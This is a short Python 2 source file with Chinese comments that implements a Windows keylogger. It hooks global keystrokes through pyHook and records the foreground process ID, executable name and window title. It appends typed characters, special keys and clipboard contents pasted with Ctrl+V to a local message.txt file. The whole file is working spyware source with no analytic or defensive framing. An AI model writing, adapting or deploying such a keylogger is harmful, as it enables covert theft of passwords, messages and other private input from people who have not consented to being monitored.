# encoding:utf-8

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    # 将进程ID存入变量中
    process_id = "%d" % pid.value
    # 申请内存
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    # 读取窗口标题
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)
    # 存入本地的一个message.txt文件中
    with open("message.txt", "ab") as f:
        f.write("\n")
        f.write("[ PID:%s-%s-%s]\n" % (process_id, executable.value, windows_title.value))
        f.write("\n")
    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# 定义击键监听事件函数
def KeyStroke(event):
    global current_window
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
    # 检测击键是否常规按键（非组合键等）
    print('\n\n\n\n')
    print('\n'.join(['%s:%s' % item for item in event.__dict__.items()]))
    if 32 < event.Ascii < 127:
        with open("message.txt", "ab") as f:
            f.write(chr(event.Ascii))
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            with open("message.txt", "ab") as f:
                f.write("[PASTE]-%s" % pasted_value)
        else:
            with open("message.txt", "ab") as f:
                f.write("[%s]" % event.Key)
    # 循环监听下一个击键事件
    return True


def main():
    # 创建并注册hook管理器
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    # 注册hook并执行
    kl.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':
    main()
